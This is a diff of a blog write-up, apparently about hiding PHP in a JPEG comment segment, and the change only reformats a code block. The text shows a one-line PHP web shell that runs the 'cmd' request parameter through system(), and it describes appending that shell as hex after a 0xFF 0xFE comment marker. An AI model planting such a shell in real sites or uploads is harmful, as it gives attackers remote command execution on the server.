@@ -51,10 +51,9 @@ Here are some [details on what these markers mean](https://github.com/corkami/fo
 
 Following, I injected this PHP code, which allows remote code execution on the web (notice the `cmd` bit):
 
-{% highlight php %}
+```php
 <?php echo "<br/><br/>"; echo system($_GET["cmd"]); exit() ?>
-{% endhighlight %}
-
+```
 
 Next, I’m appending this code as hex. I used the comment JPG markers, starting with the `0xFF 0xFE` bytes, followed by two more bytes specifying the comment’s length + 2 in hex (`0x00 0x3F` - 63 in decimal). Here’s the whole buffer at this point:
 
